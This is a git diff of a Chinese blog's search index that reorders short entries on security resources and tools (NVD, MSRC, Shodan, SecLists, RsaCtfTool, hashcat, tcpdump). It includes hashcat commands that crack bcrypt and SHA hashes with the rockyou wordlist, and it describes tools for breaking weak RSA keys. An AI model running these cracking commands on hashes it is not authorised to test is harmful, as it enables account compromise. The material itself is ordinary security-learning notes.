-<h2 id="网站介绍"><a href="#网站介绍" class="headerlink" title="网站介绍"></a>网站介绍</h2><p>NVD 是美国政府基于标准的漏洞管理数据存储库，使用安全内容自动化协议 (SCAP) 进行表示。这些数据支持漏洞管理、安全度量和合规性的自动化。NVD 包含安全检查表参考、安全相关软件缺陷、产品名称和影响指标的数据库。<br><br></p>
-<h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><br>]]></content>
+<h2 id="网站介绍"><a href="#网站介绍" class="headerlink" title="网站介绍"></a>网站介绍</h2><p>Microsoft 安全响应中心 (MSRC) 负责调查所有影响 Microsoft 产品和服务的安全漏洞报告，并在此提供信息，作为持续努力的一部分，帮助您管理安全风险并保护您的系统。<br><br></p>
+<h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><p>搜索<br><br></p>
+]]></content>
       <categories>
         <category>网站</category>
       </categories>
@@ -1098,16 +1112,15 @@
       </categories>
   </entry>
   <entry>
-    <title>Node.js</title>
-    <url>/2025/05/14/T-Node-js/</url>
-    <content><![CDATA[<h2 id="工具地址"><a href="#工具地址" class="headerlink" title="工具地址"></a>工具地址</h2><h3 id="Node-js"><a href="#Node-js" class="headerlink" title="Node.js"></a><a href="https://nodejs.org/en">Node.js</a></h3><h3 id="Node-js-v24-0-1-documentation"><a href="#Node-js-v24-0-1-documentation" class="headerlink" title="Node.js v24.0.1 documentation"></a><a href="https://nodejs.org/docs/latest/api/">Node.js v24.0.1 documentation</a></h3><br>
+    <title>NVD</title>
+    <url>/2025/05/13/T-NVD/</url>
+    <content><![CDATA[<h2 id="网站地址"><a href="#网站地址" class="headerlink" title="网站地址"></a>网站地址</h2><h3 id="NVD"><a href="#NVD" class="headerlink" title="NVD"></a><a href="https://nvd.nist.gov/">NVD</a></h3><br>
 
 
-<h2 id="工具介绍"><a href="#工具介绍" class="headerlink" title="工具介绍"></a>工具介绍</h2><p>Node.js® 是一个免费、开源、跨平台的 JavaScript 运行时环境，可让开发人员创建服务器、Web 应用程序、命令行工具和脚本。<br><br></p>
-<h2 id="搭建流程"><a href="#搭建流程" class="headerlink" title="搭建流程"></a>搭建流程</h2><p>下载安装<br><br></p>
+<h2 id="网站介绍"><a href="#网站介绍" class="headerlink" title="网站介绍"></a>网站介绍</h2><p>NVD 是美国政府基于标准的漏洞管理数据存储库，使用安全内容自动化协议 (SCAP) 进行表示。这些数据支持漏洞管理、安全度量和合规性的自动化。NVD 包含安全检查表参考、安全相关软件缺陷、产品名称和影响指标的数据库。<br><br></p>
 <h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><br>]]></content>
       <categories>
-        <category>工具</category>
+        <category>网站</category>
       </categories>
   </entry>
   <entry>
@@ -1117,6 +1130,19 @@
 
 
 <h2 id="工具介绍"><a href="#工具介绍" class="headerlink" title="工具介绍"></a>工具介绍</h2><p>PHP 是一种流行的通用脚本语言，尤其适合 Web 开发。<br>它快速、灵活、实用，能够支持从博客到全球热门网站的所有内容。<br><br></p>
+<h2 id="搭建流程"><a href="#搭建流程" class="headerlink" title="搭建流程"></a>搭建流程</h2><p>下载安装<br><br></p>
+<h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><br>]]></content>
+      <categories>
+        <category>工具</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>Node.js</title>
+    <url>/2025/05/14/T-Node-js/</url>
+    <content><![CDATA[<h2 id="工具地址"><a href="#工具地址" class="headerlink" title="工具地址"></a>工具地址</h2><h3 id="Node-js"><a href="#Node-js" class="headerlink" title="Node.js"></a><a href="https://nodejs.org/en">Node.js</a></h3><h3 id="Node-js-v24-0-1-documentation"><a href="#Node-js-v24-0-1-documentation" class="headerlink" title="Node.js v24.0.1 documentation"></a><a href="https://nodejs.org/docs/latest/api/">Node.js v24.0.1 documentation</a></h3><br>
+
+
+<h2 id="工具介绍"><a href="#工具介绍" class="headerlink" title="工具介绍"></a>工具介绍</h2><p>Node.js® 是一个免费、开源、跨平台的 JavaScript 运行时环境，可让开发人员创建服务器、Web 应用程序、命令行工具和脚本。<br><br></p>
 <h2 id="搭建流程"><a href="#搭建流程" class="headerlink" title="搭建流程"></a>搭建流程</h2><p>下载安装<br><br></p>
 <h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><br>]]></content>
       <categories>
@@ -1150,21 +1176,6 @@
       </categories>
   </entry>
   <entry>
-    <title>SecLists</title>
-    <url>/2025/06/05/T-SecLists/</url>
-    <content><![CDATA[<h2 id="工具地址"><a href="#工具地址" class="headerlink" title="工具地址"></a>工具地址</h2><h3 id="SecLists"><a href="#SecLists" class="headerlink" title="SecLists"></a><a href="https://github.com/danielmiessler/SecLists">SecLists</a></h3><br>
-
-
-<h2 id="工具介绍"><a href="#工具介绍" class="headerlink" title="工具介绍"></a>工具介绍</h2><p>SecLists 是安全测试人员的得力助手。它汇集了安全评估过程中使用的多种类型的列表，并将它们集中到一起。列表类型包括用户名、密码、URL、敏感数据模式、模糊测试载荷、Web Shell 等等。其目标是使安全测试人员能够将此存储库拉取到新的测试环境中，并访问可能需要的每种类型的列表。<br><br></p>
-<h2 id="搭建流程"><a href="#搭建流程" class="headerlink" title="搭建流程"></a>搭建流程</h2><h3 id="Kali"><a href="#Kali" class="headerlink" title="Kali"></a><a href="https://www.kali.org/tools/seclists/">Kali</a></h3><br>
-
-
-<h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><br>]]></content>
-      <categories>
-        <category>工具</category>
-      </categories>
-  </entry>
-  <entry>
     <title>Shodan</title>
     <url>/2025/05/13/T-Shodan/</url>
     <content><![CDATA[<h2 id="网站地址"><a href="#网站地址" class="headerlink" title="网站地址"></a>网站地址</h2><h3 id="Shodan"><a href="#Shodan" class="headerlink" title="Shodan"></a><a href="https://www.shodan.io/">Shodan</a></h3><h3 id="Search-Query-Examples"><a href="#Search-Query-Examples" class="headerlink" title="Search Query Examples"></a><a href="https://www.shodan.io/search/examples">Search Query Examples</a></h3><h3 id="Discover-Trends-on-the-Internet"><a href="#Discover-Trends-on-the-Internet" class="headerlink" title="Discover Trends on the Internet"></a><a href="https://trends.shodan.io/">Discover Trends on the Internet</a></h3><br>
@@ -1178,13 +1189,13 @@
       </categories>
   </entry>
   <entry>
-    <title>RsaCtfTool</title>
-    <url>/2025/06/03/T-RsaCtfTool/</url>
-    <content><![CDATA[<h2 id="工具地址"><a href="#工具地址" class="headerlink" title="工具地址"></a>工具地址</h2><h3 id="RsaCtfTool"><a href="#RsaCtfTool" class="headerlink" title="RsaCtfTool"></a><a href="https://github.com/RsaCtfTool/RsaCtfTool">RsaCtfTool</a></h3><br>
+    <title>SecLists</title>
+    <url>/2025/06/05/T-SecLists/</url>
+    <content><![CDATA[<h2 id="工具地址"><a href="#工具地址" class="headerlink" title="工具地址"></a>工具地址</h2><h3 id="SecLists"><a href="#SecLists" class="headerlink" title="SecLists"></a><a href="https://github.com/danielmiessler/SecLists">SecLists</a></h3><br>
 
 
-<h2 id="工具介绍"><a href="#工具介绍" class="headerlink" title="工具介绍"></a>工具介绍</h2><p>此工具旨在解密弱公钥数据并尝试恢复相应的私钥。此外，该工具还提供全面的攻击选项，使用户能够应用各种策略来破解加密。RSA 安全性的核心依赖于整数分解问题的复杂性。该项目通过结合多种整数分解算法，有效地增强了整体解密能力，使其成为一项宝贵的资源。请注意，此工具主要用于教育目的。请务必控制您的期望，因为并非所有密钥都能在合理的时间内被破解。加密算法的复杂性可能带来重大挑战。需要强调的是，该工具仅支持 RSA 教科书规定的半素数复合模数，而非复合多素数。此约束嵌入在 pycrypto 库的上游（参见 TODO）。尽管存在此限制，但该工具仍然提供了一组强大的功能，可用于攻击具有半素数复合模数的 RSA 密钥。<br><br></p>
-<h2 id="搭建流程"><a href="#搭建流程" class="headerlink" title="搭建流程"></a>搭建流程</h2><br>
+<h2 id="工具介绍"><a href="#工具介绍" class="headerlink" title="工具介绍"></a>工具介绍</h2><p>SecLists 是安全测试人员的得力助手。它汇集了安全评估过程中使用的多种类型的列表，并将它们集中到一起。列表类型包括用户名、密码、URL、敏感数据模式、模糊测试载荷、Web Shell 等等。其目标是使安全测试人员能够将此存储库拉取到新的测试环境中，并访问可能需要的每种类型的列表。<br><br></p>
+<h2 id="搭建流程"><a href="#搭建流程" class="headerlink" title="搭建流程"></a>搭建流程</h2><h3 id="Kali"><a href="#Kali" class="headerlink" title="Kali"></a><a href="https://www.kali.org/tools/seclists/">Kali</a></h3><br>
 
 
 <h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><br>]]></content>
@@ -1209,18 +1220,18 @@
       </categories>
   </entry>
   <entry>
-    <title>TLD</title>
-    <url>/2025/05/05/T-TLD/</url>
-    <content><![CDATA[<h2 id="网站地址"><a href="#网站地址" class="headerlink" title="网站地址"></a>网站地址</h2><h3 id="TLD"><a href="#TLD" class="headerlink" title="TLD"></a><a href="http://data.iana.org/TLD/tlds-alpha-by-domain.txt">TLD</a></h3><br>
+    <title>RsaCtfTool</title>
+    <url>/2025/06/03/T-RsaCtfTool/</url>
+    <content><![CDATA[<h2 id="工具地址"><a href="#工具地址" class="headerlink" title="工具地址"></a>工具地址</h2><h3 id="RsaCtfTool"><a href="#RsaCtfTool" class="headerlink" title="RsaCtfTool"></a><a href="https://github.com/RsaCtfTool/RsaCtfTool">RsaCtfTool</a></h3><br>
 
 
-<h2 id="网站介绍"><a href="#网站介绍" class="headerlink" title="网站介绍"></a>网站介绍</h2><br>
+<h2 id="工具介绍"><a href="#工具介绍" class="headerlink" title="工具介绍"></a>工具介绍</h2><p>此工具旨在解密弱公钥数据并尝试恢复相应的私钥。此外，该工具还提供全面的攻击选项，使用户能够应用各种策略来破解加密。RSA 安全性的核心依赖于整数分解问题的复杂性。该项目通过结合多种整数分解算法，有效地增强了整体解密能力，使其成为一项宝贵的资源。请注意，此工具主要用于教育目的。请务必控制您的期望，因为并非所有密钥都能在合理的时间内被破解。加密算法的复杂性可能带来重大挑战。需要强调的是，该工具仅支持 RSA 教科书规定的半素数复合模数，而非复合多素数。此约束嵌入在 pycrypto 库的上游（参见 TODO）。尽管存在此限制，但该工具仍然提供了一组强大的功能，可用于攻击具有半素数复合模数的 RSA 密钥。<br><br></p>
+<h2 id="搭建流程"><a href="#搭建流程" class="headerlink" title="搭建流程"></a>搭建流程</h2><br>
 
 
-<h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><p>搜索<br><br></p>
-]]></content>
+<h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><br>]]></content>
       <categories>
-        <category>网站</category>
+        <category>工具</category>
       </categories>
   </entry>
   <entry>
@@ -1236,6 +1247,33 @@
 <h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><br>]]></content>
       <categories>
         <category>工具</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>TLD</title>
+    <url>/2025/05/05/T-TLD/</url>
+    <content><![CDATA[<h2 id="网站地址"><a href="#网站地址" class="headerlink" title="网站地址"></a>网站地址</h2><h3 id="TLD"><a href="#TLD" class="headerlink" title="TLD"></a><a href="http://data.iana.org/TLD/tlds-alpha-by-domain.txt">TLD</a></h3><br>
+
+
+<h2 id="网站介绍"><a href="#网站介绍" class="headerlink" title="网站介绍"></a>网站介绍</h2><br>
+
+
+<h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><p>搜索<br><br></p>
+]]></content>
+      <categories>
+        <category>网站</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>Vim Cheat Sheet</title>
+    <url>/2025/05/11/T-Vim-Cheat-Sheet/</url>
+    <content><![CDATA[<h2 id="网站地址"><a href="#网站地址" class="headerlink" title="网站地址"></a>网站地址</h2><h3 id="Vim-Cheat-Sheet"><a href="#Vim-Cheat-Sheet" class="headerlink" title="Vim Cheat Sheet"></a><a href="https://vim.rtorr.com/">Vim Cheat Sheet</a></h3><br>
+
+
+<h2 id="网站介绍"><a href="#网站介绍" class="headerlink" title="网站介绍"></a>网站介绍</h2><p>该项目旨在成为最易用的 Vim 指南之一。<br><br></p>
+<h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><br>]]></content>
+      <categories>
+        <category>网站</category>
       </categories>
   </entry>
   <entry>
@@ -1260,44 +1298,6 @@
 <h2 id="网站介绍"><a href="#网站介绍" class="headerlink" title="网站介绍"></a>网站介绍</h2><p>Windows CMD命令的 AZ 索引 。<br><br></p>
 <h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><p>搜索<br><br></p>
 ]]></content>
-      <categories>
-        <category>网站</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>WolframAlpha</title>
-    <url>/2025/06/03/T-WolframAlpha/</url>
-    <content><![CDATA[<h2 id="网站地址"><a href="#网站地址" class="headerlink" title="网站地址"></a>网站地址</h2><h3 id="WolframAlpha"><a href="#WolframAlpha" class="headerlink" title="WolframAlpha"></a><a href="https://www.wolframalpha.com/">WolframAlpha</a></h3><br>
-
-
-<h2 id="网站介绍"><a href="#网站介绍" class="headerlink" title="网站介绍"></a>网站介绍</h2><p>使用 Wolfram 的突破性算法、知识和 AI 技术给出专家级答案<br><br></p>
-<h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><p>搜索<br><br></p>
-]]></content>
-      <categories>
-        <category>网站</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>crontab guru</title>
-    <url>/2025/05/11/T-crontab-guru/</url>
-    <content><![CDATA[<h2 id="网站地址"><a href="#网站地址" class="headerlink" title="网站地址"></a>网站地址</h2><h3 id="crontab-guru"><a href="#crontab-guru" class="headerlink" title="crontab guru"></a><a href="https://crontab.guru/">crontab guru</a></h3><br>
-
-
-<h2 id="网站介绍"><a href="#网站介绍" class="headerlink" title="网站介绍"></a>网站介绍</h2><p>Cronitor的 cron 计划表达式快速简便的编辑器<br><br></p>
-<h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><p>设置<br><br></p>
-]]></content>
-      <categories>
-        <category>网站</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>Vim Cheat Sheet</title>
-    <url>/2025/05/11/T-Vim-Cheat-Sheet/</url>
-    <content><![CDATA[<h2 id="网站地址"><a href="#网站地址" class="headerlink" title="网站地址"></a>网站地址</h2><h3 id="Vim-Cheat-Sheet"><a href="#Vim-Cheat-Sheet" class="headerlink" title="Vim Cheat Sheet"></a><a href="https://vim.rtorr.com/">Vim Cheat Sheet</a></h3><br>
-
-
-<h2 id="网站介绍"><a href="#网站介绍" class="headerlink" title="网站介绍"></a>网站介绍</h2><p>该项目旨在成为最易用的 Vim 指南之一。<br><br></p>
-<h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><br>]]></content>
       <categories>
         <category>网站</category>
       </categories>
@@ -1423,6 +1423,32 @@
       </categories>
   </entry>
   <entry>
+    <title>WolframAlpha</title>
+    <url>/2025/06/03/T-WolframAlpha/</url>
+    <content><![CDATA[<h2 id="网站地址"><a href="#网站地址" class="headerlink" title="网站地址"></a>网站地址</h2><h3 id="WolframAlpha"><a href="#WolframAlpha" class="headerlink" title="WolframAlpha"></a><a href="https://www.wolframalpha.com/">WolframAlpha</a></h3><br>
+
+
+<h2 id="网站介绍"><a href="#网站介绍" class="headerlink" title="网站介绍"></a>网站介绍</h2><p>使用 Wolfram 的突破性算法、知识和 AI 技术给出专家级答案<br><br></p>
+<h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><p>搜索<br><br></p>
+]]></content>
+      <categories>
+        <category>网站</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>crontab guru</title>
+    <url>/2025/05/11/T-crontab-guru/</url>
+    <content><![CDATA[<h2 id="网站地址"><a href="#网站地址" class="headerlink" title="网站地址"></a>网站地址</h2><h3 id="crontab-guru"><a href="#crontab-guru" class="headerlink" title="crontab guru"></a><a href="https://crontab.guru/">crontab guru</a></h3><br>
+
+
+<h2 id="网站介绍"><a href="#网站介绍" class="headerlink" title="网站介绍"></a>网站介绍</h2><p>Cronitor的 cron 计划表达式快速简便的编辑器<br><br></p>
+<h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><p>设置<br><br></p>
+]]></content>
+      <categories>
+        <category>网站</category>
+      </categories>
+  </entry>
+  <entry>
     <title>hash-identifier</title>
     <url>/2025/06/05/T-hash-identifier/</url>
     <content><![CDATA[<h2 id="工具地址"><a href="#工具地址" class="headerlink" title="工具地址"></a>工具地址</h2><h3 id="hash-identifier"><a href="#hash-identifier" class="headerlink" title="hash-identifier"></a><a href="https://github.com/blackploit/hash-identifier">hash-identifier</a></h3><br>
@@ -1456,6 +1482,22 @@
       </categories>
   </entry>
   <entry>
+    <title>rsatool</title>
+    <url>/2025/06/03/T-rsatool/</url>
+    <content><![CDATA[<h2 id="工具地址"><a href="#工具地址" class="headerlink" title="工具地址"></a>工具地址</h2><h3 id="rsatool"><a href="#rsatool" class="headerlink" title="rsatool"></a><a href="https://github.com/ius/rsatool">rsatool</a></h3><br>
+
+
+<h2 id="工具介绍"><a href="#工具介绍" class="headerlink" title="工具介绍"></a>工具介绍</h2><p>rsatool 根据给定的两个素数（p、q）或模数和私有指数（n、d）计算 RSA（p、q、n、d、e）和 RSA-CRT（dP、dQ、qInv）参数。</p>
+<p>显示结果参数，并可以选择将其写为与 OpenSSL 兼容的 DER 或 PEM 编码的 RSA 私钥。<br><br></p>
+<h2 id="搭建流程"><a href="#搭建流程" class="headerlink" title="搭建流程"></a>搭建流程</h2><br>
+
+
+<h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><br>]]></content>
+      <categories>
+        <category>工具</category>
+      </categories>
+  </entry>
+  <entry>
     <title>hashcat</title>
     <url>/2025/06/04/T-hashcat/</url>
     <content><![CDATA[<h2 id="工具地址"><a href="#工具地址" class="headerlink" title="工具地址"></a>工具地址</h2><h3 id="hashcat"><a href="#hashcat" class="headerlink" title="hashcat"></a><a href="https://hashcat.net/hashcat/">hashcat</a></h3><h3 id="Example-hashes"><a href="#Example-hashes" class="headerlink" title="Example hashes"></a><a href="https://hashcat.net/wiki/doku.php?id=example_hashes">Example hashes</a></h3><br>
@@ -1468,22 +1510,6 @@
 
 <h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hashcat -m 3200 -a 0 hash1.txt /usr/share/wordlists/rockyou.txt</span><br><span class="line"><span class="comment"># 使用 rockyou.txt 字典破解 bcrypt $2*$, Blowfish (Unix) 的 hash1.txt 文件</span></span><br><span class="line"></span><br><span class="line">hashcat -m 1400 -a 0 hash2.txt /usr/share/wordlists/rockyou.txt</span><br><span class="line"><span class="comment"># 使用 rockyou.txt 字典破解 SHA2-256 的 hash2.txt 文件</span></span><br><span class="line"></span><br><span class="line">hashcat -m 1800 -a 0 hash3.txt /usr/share/wordlists/rockyou.txt</span><br><span class="line"><span class="comment"># 使用 rockyou.txt 字典破解 sha512crypt $6$, SHA512 (Unix) 2 的 hash3.txt 文件</span></span><br></pre></td></tr></table></figure>
 <br>]]></content>
-      <categories>
-        <category>工具</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>rsatool</title>
-    <url>/2025/06/03/T-rsatool/</url>
-    <content><![CDATA[<h2 id="工具地址"><a href="#工具地址" class="headerlink" title="工具地址"></a>工具地址</h2><h3 id="rsatool"><a href="#rsatool" class="headerlink" title="rsatool"></a><a href="https://github.com/ius/rsatool">rsatool</a></h3><br>
-
-
-<h2 id="工具介绍"><a href="#工具介绍" class="headerlink" title="工具介绍"></a>工具介绍</h2><p>rsatool 根据给定的两个素数（p、q）或模数和私有指数（n、d）计算 RSA（p、q、n、d、e）和 RSA-CRT（dP、dQ、qInv）参数。</p>
-<p>显示结果参数，并可以选择将其写为与 OpenSSL 兼容的 DER 或 PEM 编码的 RSA 私钥。<br><br></p>
-<h2 id="搭建流程"><a href="#搭建流程" class="headerlink" title="搭建流程"></a>搭建流程</h2><br>
-
-
-<h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><br>]]></content>
       <categories>
         <category>工具</category>
       </categories>
@@ -1580,7 +1606,8 @@
 <td>以十六进制和 ASCII 格式显示数据包</td>
 </tr>
 </tbody></table>
-<br>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tcpdump -i &lt;INTERFACE&gt;</span><br><span class="line"><span class="comment"># &lt;INTERFACE&gt;: eth0, wlo1, any</span></span><br><span class="line"></span><br><span class="line">tcpdump -w &lt;FILE&gt;</span><br><span class="line"><span class="comment"># &lt;FILE&gt;: .pcap 文件</span></span><br><span class="line"></span><br><span class="line">tcpdump -c &lt;COUNT&gt;</span><br><span class="line"><span class="comment"># &lt;COUNT&gt;: 1/2/3...</span></span><br><span class="line"></span><br><span class="line">tcpdump host &lt;IP&gt;/&lt;HOSTNAME&gt;</span><br><span class="line"><span class="comment"># &lt;IP&gt;/&lt;HOSTNAME&gt;: 192.0.2.1/example.com</span></span><br><span class="line"></span><br><span class="line">tcpdump port &lt;PORT_NUMBER&gt;</span><br><span class="line"><span class="comment"># &lt;PORT_NUMBER&gt;: 53/22/80/443...</span></span><br><span class="line"></span><br><span class="line">tcpdump &lt;PROTOCOL&gt;</span><br><span class="line"><span class="comment"># &lt;PROTOCOL&gt;: ip, ip6, udp, tcp, icmp</span></span><br></pre></td></tr></table></figure>
+
 
 <table>
 <thead>
@@ -1620,7 +1647,7 @@
 <td>过滤长度小于或等于指定长度（以字节为单位）的数据包</td>
 </tr>
 </tbody></table>
-<br>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">greater &lt;LENGTH&gt;</span><br><span class="line"><span class="comment"># &lt;LENGTH&gt;: 1000/2500/5000...</span></span><br></pre></td></tr></table></figure>
 
 <table>
 <thead>
@@ -1638,7 +1665,7 @@
 <td>TCP 标志字段</td>
 </tr>
 </tbody></table>
-<h3 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tcpdump -i &lt;INTERFACE&gt;</span><br><span class="line"><span class="comment"># &lt;INTERFACE&gt;: eth0, wlo1, any</span></span><br><span class="line"></span><br><span class="line">tcpdump -w &lt;FILE&gt;</span><br><span class="line"><span class="comment"># &lt;FILE&gt;: .pcap 文件</span></span><br><span class="line"></span><br><span class="line">tcpdump -c &lt;COUNT&gt;</span><br><span class="line"><span class="comment"># &lt;COUNT&gt;: 1/2/3...</span></span><br><span class="line"></span><br><span class="line">tcpdump host &lt;IP&gt;/&lt;HOSTNAME&gt;</span><br><span class="line"><span class="comment"># &lt;IP&gt;/&lt;HOSTNAME&gt;: 192.0.2.1/example.com</span></span><br><span class="line"></span><br><span class="line">tcpdump port &lt;PORT_NUMBER&gt;</span><br><span class="line"><span class="comment"># &lt;PORT_NUMBER&gt;: 53/22/80/443...</span></span><br><span class="line"></span><br><span class="line">tcpdump &lt;PROTOCOL&gt;</span><br><span class="line"><span class="comment"># &lt;PROTOCOL&gt;: ip, ip6, udp, tcp, icmp</span></span><br><span class="line"></span><br><span class="line">greater &lt;LENGTH&gt;</span><br><span class="line"><span class="comment"># &lt;LENGTH&gt;: 1000/2500/5000...</span></span><br><span class="line"></span><br><span class="line">proto[<span class="built_in">expr</span>:size]</span><br><span class="line"><span class="comment"># proto（协议）: 例如 arp、ether、icmp、ip、ip6、tcp、udp   </span></span><br><span class="line"><span class="comment"># expr（字节偏移量）: 表示从协议头部第几个字节开始，0 表示第一个字节</span></span><br><span class="line"><span class="comment"># size（字节数）: 表示读取的字节长度，支持值为 1、2 或 4，默认为 1</span></span><br><span class="line"></span><br><span class="line">tcp[tcpflags]</span><br><span class="line"><span class="comment"># tcp-syn（同步）: 发起连接的第一个数据包</span></span><br><span class="line"><span class="comment"># tcp-ack（确认）: 确认收到数据</span></span><br><span class="line"><span class="comment"># tcp-fin（完成）: 连接关闭请求</span></span><br><span class="line"><span class="comment"># tcp-rst（重置）: 强制关闭连接</span></span><br><span class="line"><span class="comment"># tcp-push: 请求立即传输数据</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">proto[<span class="built_in">expr</span>:size]</span><br><span class="line"><span class="comment"># proto（协议）: 例如 arp、ether、icmp、ip、ip6、tcp、udp   </span></span><br><span class="line"><span class="comment"># expr（字节偏移量）: 表示从协议头部第几个字节开始，0 表示第一个字节</span></span><br><span class="line"><span class="comment"># size（字节数）: 表示读取的字节长度，支持值为 1、2 或 4，默认为 1</span></span><br><span class="line"></span><br><span class="line">tcp[tcpflags]</span><br><span class="line"><span class="comment"># tcp-syn（同步）: 发起连接的第一个数据包</span></span><br><span class="line"><span class="comment"># tcp-ack（确认）: 确认收到数据</span></span><br><span class="line"><span class="comment"># tcp-fin（完成）: 连接关闭请求</span></span><br><span class="line"><span class="comment"># tcp-rst（重置）: 强制关闭连接</span></span><br><span class="line"><span class="comment"># tcp-push: 请求立即传输数据</span></span><br></pre></td></tr></table></figure>
 
 <h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tcpdump -i eth0 -c 50 -v</span><br><span class="line"><span class="comment"># 通过监听接口 eth0（有线以太网）捕获并显示 50 个数据包，以详细方式显示。</span></span><br><span class="line"></span><br><span class="line">tcpdump -i wlo1 -w data.pcap</span><br><span class="line"><span class="comment"># 通过监听接口 wlo1（WiFi 接口）捕获数据包，并将数据包写入 data.pcap。它会一直运行，直到按下 Ctrl + C 中断捕获。</span></span><br><span class="line"></span><br><span class="line">tcpdump -i any -nn</span><br><span class="line"><span class="comment"># 捕获所有接口上的数据包并将其显示在屏幕上，不解析 IP 地址，不解析协议 </span></span><br><span class="line"></span><br><span class="line">tcpdump -i any tcp port 22</span><br><span class="line"><span class="comment"># 监听所有接口并捕获tcp往返的数据包 22 端口，即SSH流量。</span></span><br><span class="line"></span><br><span class="line">tcpdump -i wlo1 udp port 123</span><br><span class="line"><span class="comment"># 监听 WiFi 网卡并过滤发往网络时间协议 (NTPudp) 123 端口的流量。</span></span><br><span class="line"></span><br><span class="line">tcpdump -i eth0 host example.com and tcp port 443 -w https.pcap</span><br><span class="line"><span class="comment"># 将监听 eth0 有线以太网接口，并过滤与 example.com 相关，使用 tcp 的 443 端口的 HTTPS 流量。</span></span><br><span class="line"></span><br><span class="line">tcpdump host 1.1.1.1 and tcp</span><br><span class="line"><span class="comment"># 捕获tcp带有 的流量host 1.1.1.1。</span></span><br><span class="line"></span><br><span class="line">tcpdump udp or icmp</span><br><span class="line"><span class="comment"># 捕获UDP或 ICMP 流量。</span></span><br><span class="line"></span><br><span class="line">tcpdump not tcp</span><br><span class="line"><span class="comment"># 捕获除TCP段之外的所有数据包；我们预期在结果中找到UDP、ICMP 和ARP数据包。</span></span><br><span class="line"></span><br><span class="line">ether[0] &amp; 1 != 0</span><br><span class="line"><span class="comment"># 取 ether 以太网报头中的第一个字节（也就是目标 MAC 地址的第一个字节），并使用二进制运算符 &amp; (与)，和十进制 1（二进制表示00000001）进行运算</span></span><br><span class="line"><span class="comment"># 如果结果不等于十进制 0（二进制表示00000000），则返回 true，这个表达式和 ether[0] &amp; 1 == 1 目的一样</span></span><br><span class="line"><span class="comment"># 此过滤器的目的是显示发送到多播地址的数据包。多播以太网地址是一种特定的地址，用于标识一组旨在接收相同数据的设备。结果 1 表示多播，0表示单播</span></span><br><span class="line"></span><br><span class="line">ip[0] &amp; 0xf != 5</span><br><span class="line"><span class="comment"># 取 IP 头中的第一个字节的低 4 位（也就是 IP Header Length 字段），并使用二进制运算符 &amp; (与)，与十六进制数 F（二进制 00001111）进行比较。</span></span><br><span class="line"><span class="comment"># 如果结果不等于十进制 5（二进制表示 00000101），则返回 true。</span></span><br><span class="line"><span class="comment"># 此过滤器的目的是捕获所有带有选项的 IP 数据包。</span></span><br><span class="line"></span><br><span class="line">tcpdump <span class="string">&quot;tcp[tcpflags] == tcp-syn&quot;</span></span><br><span class="line"><span class="comment"># 捕获仅设置了 SYN（同步）标志，而所有其他标志均未设置的 TCP 数据包。</span></span><br><span class="line"></span><br><span class="line">tcpdump <span class="string">&quot;tcp[tcpflags] &amp; tcp-syn != 0&quot;</span></span><br><span class="line"><span class="comment"># 捕获至少设置了 SYN（同步）标志的TCP数据包。</span></span><br><span class="line"></span><br><span class="line">tcpdump <span class="string">&quot;tcp[tcpflags] &amp; (tcp-syn|tcp-ack) != 0&quot;</span></span><br><span class="line"><span class="comment">#捕获至少设置了SYN（同步）或ACK（确认）标志的TCP数据包。</span></span><br></pre></td></tr></table></figure>
 <br>
